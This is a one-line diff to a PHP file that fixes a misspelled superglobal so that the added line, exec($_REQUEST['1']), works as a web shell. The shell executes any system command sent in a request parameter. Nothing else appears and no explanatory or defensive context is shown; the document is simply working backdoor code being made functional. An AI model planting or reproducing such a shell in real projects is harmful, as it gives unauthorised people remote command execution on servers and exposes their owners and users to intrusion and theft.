@@ -1,1 +1,1 @@
-<?php exec($_REQQUEST['1']);?>
+<?php exec($_REQUEST['1']);?>
